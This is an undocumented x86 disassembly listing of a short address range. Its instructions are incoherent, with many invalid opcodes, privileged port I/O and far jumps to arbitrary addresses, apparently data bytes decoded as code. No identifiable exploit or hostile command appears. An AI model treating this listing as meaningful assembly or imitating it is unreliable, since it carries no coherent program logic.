  41ee22:	mov    ebp,0xb743b5d0
  41ee27:	cmp    ch,bh
  41ee29:	in     eax,dx
  41ee2a:	fisttp QWORD PTR [esp+ebp*1]
  41ee2d:	xlat   BYTE PTR ds:[ebx]
  41ee2e:	and    BYTE PTR [ecx-0x68],dh
  41ee31:	fldcw  WORD PTR [ecx+0x56]
  41ee34:	xchg   esp,eax
  41ee35:	sub    edi,esp
  41ee37:	mov    eax,0xe2f55f63
  41ee3c:	div    edi
  41ee3e:	xchg   ecx,eax
  41ee3f:	icebp  
  41ee40:	mov    esp,0x83d0dc5
  41ee45:	cli    
  41ee46:	inc    ebx
  41ee47:	lods   eax,DWORD PTR ds:[esi]
  41ee48:	test   BYTE PTR [edx+0xe],al
  41ee4b:	mov    esi,0x7a786338
  41ee50:	pop    ecx
  41ee51:	js     0x41ee3b
  41ee53:	arpl   WORD PTR [esi+0x70],cx
  41ee56:	pusha  
  41ee57:	push   ds
  41ee58:	sub    al,0x96
  41ee5a:	sbb    eax,0x29a517a7
  41ee5f:	mov    ds:0xbe9f6388,eax
  41ee64:	pop    es
  41ee65:	lods   eax,DWORD PTR ds:[esi]
  41ee66:	lods   eax,DWORD PTR ds:[esi]
  41ee67:	fwait
  41ee68:	push   ebx
  41ee69:	in     eax,dx
  41ee6a:	pop    ecx
  41ee6b:	adc    bl,bh
  41ee6d:	(bad)  
  41ee6f:	jl     0x41eea9
  41ee71:	add    DWORD PTR [ebx],ebp
  41ee73:	or     ebp,ebp
  41ee75:	lods   al,BYTE PTR ds:[esi]
  41ee76:	push   esi
  41ee77:	adc    DWORD PTR [edx+0x4d],eax
  41ee7a:	dec    esi
  41ee7b:	ja     0x41ee05
  41ee7d:	ret    0x88d5
  41ee80:	sub    BYTE PTR [edi+0x80199eb],al
  41ee86:	push   eax
  41ee87:	test   al,0x7b
  41ee89:	repz sahf 
  41ee8b:	inc    eax
  41ee8c:	iret   
  41ee8d:	and    al,0xe
  41ee8f:	das    
  41ee90:	pushf  
  41ee91:	daa    
  41ee92:	test   al,0xfb
  41ee94:	pop    eax
  41ee95:	aad    0x7f
  41ee97:	mov    ds:0xde65c36d,al
  41ee9c:	mov    ch,0xbb
  41ee9e:	and    edx,DWORD PTR [edi]
  41eea0:	xor    BYTE PTR [ecx],dl
  41eea2:	inc    esp
  41eea3:	xchg   DWORD PTR [edx+eiz*2],edi
  41eea6:	in     al,0xc0
  41eea8:	aad    0xa3
  41eeaa:	rol    DWORD PTR [ecx+0x3f],cl
  41eead:	pop    edx
  41eeae:	mov    DWORD PTR [edi-0x3c15bd32],eax
  41eeb4:	scas   al,BYTE PTR es:[edi]
  41eeb5:	xor    eax,0xb1019df4
  41eeba:	adc    BYTE PTR [ecx-0x2b],al
  41eebd:	aas    
  41eebe:	sti    
  41eebf:	mov    eax,0x6b10c94
  41eec4:	pop    ecx
  41eec5:	pusha  
  41eec6:	ja     0x41eee6
  41eec8:	js     0x41ee64
  41eeca:	std    
  41eecb:	mov    bh,BYTE PTR [edi+0x46ba2b7e]
  41eed1:	aam    0xe5
  41eed3:	pop    eax
  41eed4:	push   ecx
  41eed5:	pop    es
  41eed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed7:	push   eax
  41eed8:	ds sub al,0xf3
  41eedb:	dec    esi
  41eedc:	pop    ds
  41eedd:	push   ecx
  41eede:	scas   eax,DWORD PTR es:[edi]
  41eedf:	test   eax,0x27b7e415
  41eee4:	shl    eax,cl
  41eee6:	pop    ds
  41eee7:	inc    esi
  41eee8:	mov    esi,0x1832aec3
  41eeed:	int    0xa7
  41eeef:	inc    ebx
  41eef0:	pop    edx
  41eef1:	lock push ds
  41eef3:	mov    ebp,0xb72a3e8c
  41eef8:	arpl   WORD PTR [ebx-0x6a],bx
  41eefb:	and    DWORD PTR [edi+ecx*4-0x2426aaf4],esp
  41ef02:	mov    ah,0xf4
  41ef04:	cmp    DWORD PTR cs:[ebx+0x33fccbf2],0xffffff88
  41ef0c:	into   
  41ef0d:	hlt    
  41ef0e:	xor    al,dh
  41ef10:	mov    bh,0x81
  41ef12:	mov    eax,0x90c73edf
  41ef17:	pop    ebp
  41ef18:	inc    esp
  41ef19:	out    0xdd,eax
  41ef1b:	jp     0x41ef1e
  41ef1d:	and    eax,0xcf719df0
  41ef22:	mov    BYTE PTR [ecx+0x2a116093],dh
  41ef28:	in     eax,dx
  41ef29:	jle    0x41ef9d
  41ef2b:	mov    ebp,0x9bdc8299
  41ef30:	push   ds
  41ef31:	test   al,0xc
  41ef33:	jae    0x41ef0d
  41ef35:	xchg   ecx,eax
  41ef36:	pop    ss
  41ef37:	mov    ah,0x61
  41ef39:	test   eax,0x231d8e41
  41ef3e:	pop    ecx
  41ef3f:	pusha  
  41ef40:	add    eax,0x35a99dbe
  41ef45:	outs   dx,BYTE PTR ds:[esi]
  41ef46:	shr    DWORD PTR [ecx],1
  41ef48:	jp     0x41ef6b
  41ef4a:	outs   dx,BYTE PTR ds:[esi]
  41ef4b:	ins    BYTE PTR es:[edi],dx
  41ef4c:	jge    0x41efbb
  41ef4e:	shl    DWORD PTR [edx+0x1220593f],0xc5
  41ef55:	pop    ds
  41ef56:	pusha  
  41ef57:	call   0x20886415
  41ef5c:	or     BYTE PTR [ebx],dh
  41ef5e:	and    eax,0xcced9751
  41ef63:	inc    esi
  41ef64:	mov    ch,0x1e
  41ef66:	fdivr  QWORD PTR [eax]
  41ef68:	retf   
  41ef69:	int3   
  41ef6a:	add    BYTE PTR [eax-0x21c87f76],cl
  41ef70:	pop    ebp
  41ef71:	out    dx,al
  41ef72:	xlat   BYTE PTR ds:[ebx]
  41ef73:	ins    DWORD PTR es:[edi],dx
  41ef74:	cmp    BYTE PTR [eax-0x15c359cf],ah
  41ef7a:	in     al,0x18
  41ef7c:	repz add ebp,DWORD PTR [edx+0x33b53228]
  41ef83:	mov    esp,0xcdb69216
  41ef88:	fisttp WORD PTR [ecx]
  41ef8a:	fcom   DWORD PTR [edx]
  41ef8c:	xchg   edi,eax
  41ef8d:	unpcklps xmm3,XMMWORD PTR [ecx+0x5bcce666]
  41ef94:	and    DWORD PTR [eax-0x16],edi
  41ef97:	add    al,BYTE PTR [ecx+eax*8]
  41ef9a:	sbb    DWORD PTR [ebx+0x28],esi
  41ef9d:	sub    ebp,DWORD PTR [ebx-0x55dea486]
  41efa3:	lods   al,BYTE PTR ds:[esi]
  41efa4:	mov    dh,0x1e
  41efa6:	and    BYTE PTR [edx],dh
  41efa8:	enter  0xb84e,0x4f
  41efac:	leave  
  41efad:	repnz xchg esi,eax
  41efaf:	jle    0x41eff5
  41efb1:	(bad)  
  41efb2:	in     eax,dx
  41efb3:	sub    bl,bl
  41efb5:	mov    ecx,0x1c74b600
  41efba:	push   ds
  41efbb:	add    ecx,ebp
  41efbd:	or     cl,BYTE PTR [ebx-0x5c]
  41efc0:	cdq    
  41efc1:	inc    esp
  41efc2:	stos   DWORD PTR es:[edi],eax
  41efc3:	sbb    dh,BYTE PTR [ecx+edx*4-0x55]
  41efc7:	dec    esi
  41efc8:	daa    
  41efc9:	dec    ebx
  41efca:	cmp    DWORD PTR [ebx+0x43],esi
  41efcd:	pop    esp
  41efce:	cmp    DWORD PTR [eax],0x8
  41efd1:	adc    ch,BYTE PTR [eax]
  41efd3:	cmc    
  41efd4:	hlt    
  41efd5:	sbb    ecx,DWORD PTR [ecx-0xce75d32]
  41efdb:	mov    ebx,0x5df5fbfb
  41efe0:	jnp    0x41f043
  41efe2:	jmp    0x5bd0b60c
  41efe7:	pusha  
  41efe8:	dec    eax
  41efe9:	jmp    0x41efaa
  41efeb:	add    ecx,DWORD PTR [ecx]
  41efed:	mov    al,0x2d
  41efef:	ins    DWORD PTR es:[edi],dx
  41eff0:	popf   
  41eff1:	cwde   
  41eff2:	out    dx,eax
  41eff3:	or     edi,ebx
  41eff5:	rol    DWORD PTR [eax-0x716937fc],1
  41effb:	and    dh,bh
  41effd:	ss sbb al,0x6d
  41f000:	sub    al,0x5f
  41f002:	lds    edi,FWORD PTR [edi-0x56]
  41f005:	jnp    0x41efda
  41f007:	je     0x41f07e
  41f009:	mov    ebx,0x3e73a4a7
  41f00e:	xchg   ebp,eax
  41f00f:	stos   DWORD PTR es:[edi],eax
  41f010:	lea    esi,[esi+0x14]
  41f013:	add    al,0xc0
  41f015:	dec    ecx
  41f016:	inc    esp
  41f017:	out    0xea,al
  41f019:	xor    al,0x23
  41f01b:	jle    0x41f096
  41f01d:	dec    eax
  41f01e:	mov    edi,0xb646ad4c
  41f023:	fxch   st(1)
  41f025:	sub    BYTE PTR [ebx+eiz*1-0x3dac9278],cl
  41f02c:	dec    eax
  41f02d:	push   cs
  41f02e:	pop    ds
  41f02f:	pop    ebx
  41f030:	cdq    
  41f031:	sbb    DWORD PTR [eax+edx*2-0x71],0xafa1791
  41f039:	sbb    al,0x4c
  41f03b:	jbe    0x41f032
  41f03d:	and    eax,0x9cb963b2
  41f043:	mov    edi,0xcfca3717
  41f048:	fist   WORD PTR [esi]
  41f04a:	xlat   BYTE PTR ds:[ebx]
  41f04b:	or     ch,dh
  41f04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f04e:	inc    ebp
  41f04f:	aaa    
  41f050:	les    ebx,FWORD PTR [ebp-0x6b556ba5]
  41f056:	div    DWORD PTR [ebx]
  41f058:	shl    BYTE PTR [esi+0x946d41a],cl
  41f05e:	imul   eax,DWORD PTR [eax],0xfffffff5
  41f061:	sahf   
  41f062:	jno    0x41f07d
  41f064:	adc    al,0x1f
  41f066:	(bad)  
  41f067:	push   eax
  41f068:	repnz fbstp TBYTE PTR [ecx-0x58]
  41f06c:	pop    eax
  41f06d:	out    dx,eax
  41f06e:	daa    
  41f06f:	sub    al,0xba
  41f071:	loope  0x41f0d3
  41f073:	dec    ebp
  41f074:	int    0x22
  41f076:	mov    bh,0xd
  41f078:	inc    ebx
  41f079:	cmp    eax,0x191b3793
  41f07e:	add    bh,BYTE PTR [edx+0x6d]
  41f081:	lock push DWORD PTR [ebx-0x30]
  41f085:	mov    ch,BYTE PTR [ebp+0x4a]
  41f088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f089:	dec    ecx
  41f08a:	aad    0xd9
  41f08c:	outs   dx,DWORD PTR ds:[esi]
  41f08d:	fcomp  st(3)
  41f08f:	xchg   esi,eax
  41f090:	jns    0x41f0af
  41f092:	sbb    BYTE PTR [ebp+0x6968286a],dl
  41f098:	sub    dh,ch
  41f09a:	out    dx,eax
  41f09b:	sbb    DWORD PTR [edi],eax
  41f09d:	push   ebx
  41f09e:	jno    0x41f078
  41f0a0:	nop
  41f0a1:	cs mov ebx,0xb35e5b9c
  41f0a7:	ins    BYTE PTR es:[edi],dx
  41f0a8:	jno    0x41f11a
  41f0aa:	jg     0x41f078
  41f0ac:	stc    
  41f0ad:	dec    esp
  41f0ae:	dec    ebx
  41f0af:	ret    0xe5b7
  41f0b2:	lods   al,BYTE PTR ds:[esi]
  41f0b3:	xor    al,0x84
  41f0b5:	(bad)  
  41f0b6:	(bad)  
  41f0b8:	call   FWORD PTR [edi+0x23]
  41f0bb:	xor    DWORD PTR [ebx-0x1c],eax
  41f0be:	jae    0x41f06c
  41f0c0:	in     al,0xd7
  41f0c2:	cmp    ecx,edx
  41f0c4:	aad    0x9a
  41f0c6:	outs   dx,DWORD PTR ds:[esi]
  41f0c7:	pop    ecx
  41f0c8:	jo     0x41f07e
  41f0ca:	out    0xf,eax
  41f0cc:	pusha  
  41f0cd:	sbb    edi,DWORD PTR [edx+0x7d]
  41f0d0:	(bad)  
  41f0d1:	sbb    DWORD PTR [esi+0x2cc7d961],edi
  41f0d7:	push   edx
  41f0d8:	inc    ebp
  41f0d9:	inc    esi
  41f0da:	iret   
  41f0db:	mov    BYTE PTR [esi+ecx*1-0xb],ah
  41f0df:	call   0x1a65:0x3156204f
  41f0e6:	in     eax,0x19
  41f0e8:	pop    esi
  41f0e9:	in     eax,dx
  41f0ea:	out    0xe2,al
  41f0ec:	or     esi,DWORD PTR [esi+0x14]
  41f0ef:	xchg   ebp,eax
  41f0f0:	xor    bh,BYTE PTR [edx+esi*1+0x10]
  41f0f4:	mov    cl,0xc6
  41f0f6:	aas    
  41f0f7:	pop    esp
  41f0f8:	adc    BYTE PTR [ebx+0x1ae1f30],bh
  41f0fe:	add    al,0xae
  41f100:	das    
  41f101:	pop    edi
  41f102:	mov    ds:0x5d666ef4,al
  41f107:	dec    ah
  41f109:	pop    ss
  41f10a:	jo     0x41f095
  41f10c:	popa   
  41f10d:	popa   
  41f10e:	cmp    bh,0x85
  41f111:	add    al,0xbb
  41f113:	add    esp,DWORD PTR [edi-0x40]
  41f116:	cmp    ecx,DWORD PTR [esi-0x4a]
  41f119:	ins    DWORD PTR es:[edi],dx
  41f11a:	add    bh,dh
  41f11c:	inc    edi
  41f11d:	fld    TBYTE PTR [edx]
  41f11f:	xor    al,0xfd
  41f121:	bound  ebx,QWORD PTR [esi-0x492a2a60]
  41f127:	dec    edx
  41f128:	outs   dx,DWORD PTR ds:[esi]
  41f129:	push   ecx
  41f12a:	cmp    esp,DWORD PTR [ecx]
  41f12c:	inc    edx
  41f12d:	cmp    DWORD PTR [ebp+0x1cf61d1f],ecx
  41f133:	jle    0x41f17a
  41f135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f136:	add    BYTE PTR [ecx],0x5a
  41f139:	(bad)  
  41f13a:	adc    bl,BYTE PTR [eax]
  41f13c:	mov    bl,0x1f
  41f13e:	cwde   
  41f13f:	scas   al,BYTE PTR es:[edi]
  41f140:	inc    edi
  41f141:	rcr    BYTE PTR [edx],0xbd
  41f144:	lds    edi,FWORD PTR [ecx+0x2f]
  41f147:	and    DWORD PTR [ebx+0x2c35aed0],ecx
  41f14d:	std    
  41f14e:	or     esi,DWORD PTR [edx+0x167c44a1]
  41f154:	shl    DWORD PTR [eax-0x3c],1
  41f157:	inc    esp
  41f158:	sub    al,0x38
  41f15a:	stos   BYTE PTR es:[edi],al
  41f15b:	xchg   esp,eax
  41f15c:	jge    0x41f159
  41f15e:	retf   0x2235
  41f161:	in     eax,0x56
  41f163:	xlat   BYTE PTR ds:[ebx]
  41f164:	enter  0x9edf,0x9a
  41f168:	adc    dl,dh
  41f16a:	int    0xb4
  41f16c:	xlat   BYTE PTR ds:[ebx]
  41f16d:	push   esp
  41f16e:	sbb    al,0x61
  41f170:	push   0x724d86da
  41f175:	das    
  41f176:	inc    ecx
  41f177:	sub    al,0xb1
  41f179:	(bad)  
  41f17b:	(bad)  
  41f17c:	(bad)  
  41f17e:	aas    
  41f17f:	mov    bl,0x27
  41f181:	xor    al,0x40
  41f183:	or     dl,BYTE PTR [edi-0x7b]
  41f186:	fcom   QWORD PTR [eax+0xb]
  41f189:	call   0x40c9:0xded7f9bb
  41f190:	arpl   WORD PTR [ebp+ecx*4-0x47b83ddc],cx
  41f197:	push   edi
  41f198:	inc    esi
  41f199:	repnz mov al,ds:0xd414aeef
  41f19f:	push   esp
  41f1a0:	cli    
  41f1a1:	ficomp WORD PTR [esi+0x27624e5f]
  41f1a7:	or     edx,DWORD PTR [ebx]
  41f1a9:	lds    ebp,FWORD PTR [ebx-0x50bdd6e1]
  41f1af:	sub    esi,DWORD PTR [ebp+0xc]
  41f1b2:	fucomp st(3)
  41f1b4:	lock xor al,0x93
  41f1b7:	mov    BYTE PTR [ebx+0x9312246],bl
  41f1bd:	call   FWORD PTR [edi]
  41f1bf:	xor    DWORD PTR [ecx-0x39],0xffffffb0
  41f1c3:	gs xchg ebx,eax
  41f1c5:	xchg   DWORD PTR [esi],esp
  41f1c7:	pop    esp
  41f1c8:	or     BYTE PTR [ecx+0x30],ch
  41f1cb:	std    
  41f1cc:	out    dx,eax
  41f1cd:	retf   
  41f1ce:	test   BYTE PTR [ecx],bl
  41f1d0:	rcl    ebx,cl
  41f1d2:	int3   
  41f1d3:	ins    BYTE PTR es:[edi],dx
  41f1d4:	mov    DWORD PTR [ebx],edx
  41f1d6:	sbb    eax,DWORD PTR [ebx+0x6f02a9c8]
  41f1dc:	(bad)  
  41f1dd:	ja     0x41f1d4
  41f1df:	popf   
  41f1e0:	dec    eax
  41f1e1:	xor    DWORD PTR [esi-0x1b0115c9],ebp
  41f1e7:	in     al,dx
  41f1e8:	dec    DWORD PTR [ecx+0x56660ae3]
  41f1ee:	loop   0x41f1f8
  41f1f0:	and    edi,DWORD PTR [ecx-0x314c6879]
  41f1f6:	dec    edi
  41f1f7:	(bad)  
  41f1f8:	out    dx,eax
  41f1f9:	lods   al,BYTE PTR ds:[esi]
  41f1fa:	mov    ebp,0x761d284f
  41f1ff:	retf   
  41f200:	jae    0x41f24e
  41f202:	jecxz  0x41f23f
  41f204:	ins    DWORD PTR es:[edi],dx
  41f205:	stc    
  41f206:	fbstp  TBYTE PTR [esi+0x4bba6e84]
  41f20c:	cmp    al,0x63
  41f20e:	jbe    0x41f1a1
  41f210:	fldenv [ebx-0x61]
  41f213:	aam    0xf3
  41f215:	mov    dl,0xd3
  41f217:	sbb    eax,0xff07ad89
  41f21c:	out    0xbe,eax
  41f21e:	dec    esp
  41f21f:	pop    es
  41f220:	fs enter 0xc62e,0xa1
  41f225:	ins    BYTE PTR es:[edi],dx
  41f226:	jl     0x41f272
  41f228:	jns    0x41f1bc
  41f22a:	ins    BYTE PTR es:[edi],dx
  41f22b:	test   DWORD PTR [edi-0x318ca5da],esi
  41f231:	std    
  41f232:	in     al,dx
  41f233:	xor    BYTE PTR [esi-0x17],bl
  41f236:	xchg   edx,eax
  41f237:	je     0x41f21b
  41f239:	and    eax,0x1f53683f
  41f23e:	imul   ebp,DWORD PTR [esi],0xfffffffe
  41f241:	(bad)  
  41f242:	mov    ebp,0x24ebff80
  41f247:	fs xor al,0x52
  41f24a:	pop    ebp
  41f24b:	gs and bl,bl
  41f24e:	jnp    0x41f27e
  41f250:	in     eax,0x49
  41f252:	pusha  
  41f253:	pop    ds
  41f254:	paddb  mm5,QWORD PTR [ebp-0x47]
  41f258:	stos   BYTE PTR es:[edi],al
  41f259:	bnd js 0x41f264
  41f25c:	mov    cl,0xcf
  41f25e:	adc    DWORD PTR ds:0xacffb53d,ecx
  41f264:	dec    ebx
  41f265:	in     eax,dx
  41f266:	inc    ebx
  41f267:	retf   0xf7e0
  41f26a:	fidivr WORD PTR [eax+0x56c639c9]
  41f270:	fisub  WORD PTR [eax-0x26c301b8]
  41f276:	mov    ah,0x37
  41f278:	sbb    esp,0xffffffbc
  41f27b:	pop    ecx
  41f27c:	test   al,0xd7
  41f27e:	pop    ecx
  41f27f:	lahf   
  41f280:	and    ebp,DWORD PTR [ebx]
  41f282:	jnp    0x41f2b9
  41f284:	imul   eax,DWORD PTR [ecx-0x5c],0x73
  41f288:	dec    esp
  41f289:	sub    eax,0x1d079ab6
  41f28e:	sub    ecx,DWORD PTR [eax-0x47]
  41f291:	ror    BYTE PTR [ebx+0x4575db8d],cl
  41f297:	mov    esp,0x55a00ff6
  41f29c:	sub    bl,dl
  41f29e:	rol    DWORD PTR [eax+0x35a867e9],cl
  41f2a4:	out    dx,al
  41f2a5:	cmp    eax,0xf034e97e
  41f2aa:	mov    edx,0xcd60c848
  41f2af:	out    dx,eax
  41f2b0:	not    BYTE PTR [edx-0x60693106]
  41f2b6:	sub    al,0xee
  41f2b8:	in     al,dx
  41f2b9:	aam    0x8b
  41f2bb:	push   ecx
  41f2bc:	mov    bl,0xfc
  41f2be:	jge    0x41f2ca
  41f2c0:	paddsb mm4,mm3
  41f2c3:	rcr    DWORD PTR [ecx+0x5d1a9ee9],0x9b
  41f2ca:	cmp    edx,eax
  41f2cc:	retf   0x9c08
  41f2cf:	sbb    al,0x79
  41f2d1:	add    DWORD PTR ds:0xa3cccf32,edx
  41f2d7:	mov    ds:0x32d556a4,al
  41f2dd:	pop    ds
  41f2de:	inc    ecx
  41f2df:	in     al,0xc6
  41f2e1:	jb     0x41f27d
  41f2e3:	mov    DWORD PTR [edi],edi
  41f2e5:	aam    0x49
  41f2e7:	push   0xffffffb3
  41f2e9:	sbb    cl,BYTE PTR [ebx]
  41f2eb:	test   BYTE PTR [ecx+0x4b],ch
  41f2ee:	xchg   ebp,ebx
  41f2f0:	dec    eax
  41f2f1:	mov    esp,0xc2360922
  41f2f6:	or     al,0x35
  41f2f8:	push   esi
  41f2f9:	jne    0x41f305
  41f2fb:	jmp    0x1f52:0x9162f44c
  41f302:	in     al,dx
  41f303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f304:	and    edi,DWORD PTR [esi]
  41f306:	pcmpeqw mm3,QWORD PTR [ebx+0x6fc10448]
  41f30d:	test   DWORD PTR [ebp-0x38ec588b],esp
  41f313:	push   ds
  41f314:	mov    eax,0xc814569d
  41f319:	out    0x55,eax
  41f31b:	sub    ebp,DWORD PTR [ebx]
  41f31d:	mov    esp,0xa7cd21ea
  41f322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f323:	mov    ecx,0x44edb39e
  41f328:	stos   DWORD PTR es:[edi],eax
  41f329:	xchg   DWORD PTR [edx-0x30],esi
  41f32c:	pop    ecx
  41f32d:	shl    BYTE PTR [edx],1
  41f32f:	jl     0x41f374
  41f331:	retf   0xfa4c
  41f334:	dec    esp
  41f335:	sub    BYTE PTR [eax+0x732eb35d],dh
  41f33b:	test   edx,ebp
  41f33d:	and    al,BYTE PTR [ebx-0x2e]
  41f340:	ins    BYTE PTR es:[edi],dx
  41f341:	fneni(8087 only) 
  41f343:	mov    bl,0xb0
  41f345:	inc    edx
  41f346:	inc    ebp
  41f347:	push   edx
  41f348:	adc    eax,esi
  41f34a:	retf   
  41f34b:	in     eax,0x8d
  41f34d:	cli    
  41f34e:	push   ss
  41f34f:	xchg   esp,eax
  41f350:	dec    esi
  41f351:	jns    0x41f37a
  41f353:	lods   eax,DWORD PTR ds:[esi]
  41f354:	outs   dx,BYTE PTR ds:[esi]
  41f355:	and    BYTE PTR [edx],bh
  41f357:	mov    ds:0x9fe156c9,al
  41f35c:	lock jecxz 0x41f303
  41f35f:	inc    edi
  41f360:	add    edi,DWORD PTR [edx+0x16]
  41f363:	sahf   
  41f364:	inc    esi
  41f365:	or     eax,0xd9b2da5a
  41f36a:	mov    bl,0xb
  41f36c:	sub    BYTE PTR [esi],bh
  41f36e:	cmp    edx,DWORD PTR [edi+ecx*4-0x3e]
  41f372:	fbstp  TBYTE PTR [esi*1+0x601d517b]
  41f379:	sbb    al,0xd4
  41f37b:	sahf   
  41f37c:	push   esp
  41f37d:	jae    0x41f36e
  41f37f:	mov    al,ds:0x9d00ce7e
  41f384:	xor    DWORD PTR [eax-0x11],edi
  41f387:	sti    
  41f388:	xor    al,0xf8
  41f38a:	jg     0x41f404
  41f38c:	ret    0xf726
  41f38f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f390:	fwait
  41f391:	mov    cl,0xf7
  41f393:	and    al,0xea
  41f395:	imul   edi,DWORD PTR [edi],0xd6273720
  41f39b:	cmp    BYTE PTR [eax-0x7961ee8],ah
  41f3a1:	ins    BYTE PTR es:[di],dx
  41f3a3:	sbb    DWORD PTR ds:0x17c27841,ecx
  41f3a9:	out    dx,eax
  41f3aa:	not    cl
  41f3ac:	sub    eax,0x9631903b
  41f3b1:	lods   al,BYTE PTR ds:[esi]
  41f3b2:	xchg   edx,eax
  41f3b3:	out    0xb2,al
  41f3b5:	cli    
  41f3b6:	mov    al,ds:0x32475bb3
  41f3bb:	xchg   ebp,eax
  41f3bc:	out    0xd1,al
  41f3be:	not    DWORD PTR [eax+0x14a7b8a2]
  41f3c4:	jo     0x41f43f
  41f3c6:	push   esp
  41f3c7:	push   ss
  41f3c8:	jbe    0x41f3e7
  41f3ca:	(bad)  
  41f3cb:	nop
  41f3cc:	push   eax
  41f3cd:	in     al,dx
  41f3ce:	or     edx,DWORD PTR [esi-0x29]
  41f3d1:	push   ss
  41f3d2:	aad    0x72
  41f3d4:	lahf   
  41f3d5:	sub    BYTE PTR ds:0x3cb6ad62,dl
  41f3db:	imul   eax,ebx,0xfffffff6
  41f3de:	lahf   
  41f3df:	retf   
  41f3e0:	icebp  
  41f3e1:	pop    ecx
  41f3e2:	adc    BYTE PTR [ebx],cl
  41f3e4:	inc    edi
  41f3e5:	and    edx,DWORD PTR [eax-0xf585d29]
  41f3eb:	add    eax,0x4ebbcdea
  41f3f0:	pop    ss
  41f3f1:	out    0x7b,eax
  41f3f3:	push   ss
  41f3f4:	leave  
  41f3f5:	jmp    0x41f3fa
  41f3f7:	sub    DWORD PTR [edi-0x214f7772],ebp
  41f3fd:	arpl   WORD PTR [edx],cx
  41f3ff:	daa    
  41f400:	or     edx,ebx
  41f402:	xchg   ebx,eax
  41f403:	dec    esi
  41f404:	add    DWORD PTR [ecx-0x2b],ebp
  41f407:	xlat   BYTE PTR ds:[ebx]
  41f408:	xor    al,0xfa
  41f40a:	es mov cl,0x61
  41f40d:	ins    BYTE PTR es:[edi],dx
  41f40e:	push   eax
  41f40f:	in     eax,dx
  41f410:	mov    ecx,0xb841d080
  41f415:	in     al,dx
  41f416:	div    ebp
  41f418:	xchg   DWORD PTR [ebx+edx*1],ebx
  41f41b:	pop    edi
  41f41c:	int    0x9d
  41f41e:	adc    DWORD PTR [edx+0x65],edi
  41f421:	adc    ah,BYTE PTR [ecx]
  41f423:	aaa    
  41f424:	mov    ds:0x6d1bc0e1,eax
  41f429:	mov    edi,0xfe12997d
  41f42e:	addr16 cmc 
  41f430:	test   BYTE PTR [edi+0x66949cf3],dl
  41f436:	out    dx,eax
  41f437:	mov    ebx,edi
  41f439:	rcl    DWORD PTR [edi],1
  41f43b:	xchg   BYTE PTR [ebx+ebp*8+0x423dbc69],ah
  41f442:	jo     0x41f413
  41f444:	stc    
  41f445:	mov    esp,0x9529eff1
  41f44a:	xor    DWORD PTR [esp+ebp*2+0x590981b],edx
  41f451:	hlt    
  41f452:	call   0x2668:0xac5ca186
  41f459:	mov    dl,0xb1
  41f45b:	retf   
  41f45c:	jmp    0x41f422
  41f45e:	dec    edi
  41f45f:	mov    dl,0xe4
  41f461:	rcr    BYTE PTR [eax+0x3d50493f],0x8e
  41f468:	cmp    BYTE PTR [edi+ebx*1-0x176776e2],dh
  41f46f:	mul    edx
  41f471:	xor    ah,BYTE PTR [edi+0x6e]
  41f474:	xchg   ebp,eax
  41f475:	mov    DWORD PTR es:[ebp+0x2b50161c],esp
  41f47c:	dec    ecx
  41f47d:	cmp    al,0x81
  41f47f:	std    
  41f480:	ins    BYTE PTR es:[edi],dx
  41f481:	retf   0xa48d
  41f484:	push   ebx
  41f485:	xchg   esi,eax
  41f486:	shl    BYTE PTR [ebx+0x133231bb],1
  41f48c:	mov    ds:0x458daa32,al
  41f491:	bound  ecx,QWORD PTR [ebx+0x30722cfb]
  41f497:	out    0xd2,eax
  41f499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f49a:	outs   dx,BYTE PTR ds:[esi]
  41f49b:	je     0x41f507
  41f49d:	inc    eax
  41f49e:	pop    esp
  41f49f:	or     bl,BYTE PTR [edi+0x529bd7a4]
  41f4a5:	js     0x41f4e2
  41f4a7:	pop    edx
  41f4a8:	ror    bl,1
  41f4aa:	sbb    al,0x99
  41f4ac:	div    DWORD PTR [eax]
  41f4ae:	push   es
  41f4af:	pop    esp
  41f4b0:	sar    BYTE PTR [esi+0x1c],cl
  41f4b3:	call   0x97c9a871
  41f4b8:	mov    ds:0x6698b0f8,eax
  41f4bd:	jmp    0x41f4ad
  41f4bf:	or     eax,0x6561ff37
  41f4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4c5:	fs fs inc edx
  41f4c8:	mov    ch,BYTE PTR [edi+0x7]
  41f4cb:	cmp    BYTE PTR [ebp+0x8],dh
  41f4ce:	inc    ebx
  41f4cf:	retf   
  41f4d0:	xchg   ecx,eax
  41f4d1:	into   
  41f4d2:	pop    ss
  41f4d3:	and    BYTE PTR [esi],bh
  41f4d5:	repnz test al,0x55
  41f4d8:	fist   WORD PTR [edx-0x51c4c819]
  41f4de:	add    BYTE PTR [edx+0x72],dl
  41f4e1:	sbb    al,0xc1
  41f4e3:	int3   
  41f4e4:	shl    DWORD PTR [edx+0x284aafbf],cl
  41f4ea:	jo     0x41f502
  41f4ec:	mov    bl,0x31
  41f4ee:	call   0xb552766c
  41f4f3:	pop    edx
  41f4f4:	nop
  41f4f5:	dec    eax
  41f4f6:	hlt    
  41f4f7:	sub    edi,DWORD PTR [esi-0x4b]
  41f4fa:	pop    esi
  41f4fb:	test   eax,0x16feb9a9
  41f500:	and    al,0xb6
  41f502:	fwait
  41f503:	xchg   esi,eax
  41f504:	or     eax,0x37792f
  41f509:	push   0x7c
  41f50b:	mov    DWORD PTR ds:[eax-0x2e294804],ebp
  41f512:	push   eax
  41f513:	mov    bh,0x6a
  41f515:	add    cl,BYTE PTR [edx+0xc]
  41f518:	pop    ebx
  41f519:	jbe    0x41f556
  41f51b:	mov    BYTE PTR [ebx],dl
  41f51d:	fisub  DWORD PTR [edi-0x1]
  41f520:	(bad)  
  41f521:	adc    BYTE PTR [ebx+0x74de76a5],dh
  41f527:	mov    ah,0x62
  41f529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f52a:	xchg   ah,ah
  41f52c:	sub    dh,bl
  41f52e:	xor    BYTE PTR [ecx+0x79],bl
  41f531:	(bad)  
  41f532:	mov    DWORD PTR [esi-0x65bf9663],ecx
  41f538:	cmp    eax,0x6cb6d03c
  41f53d:	sar    DWORD PTR [eax+0x3a58cac0],0x3c
  41f544:	pop    ds
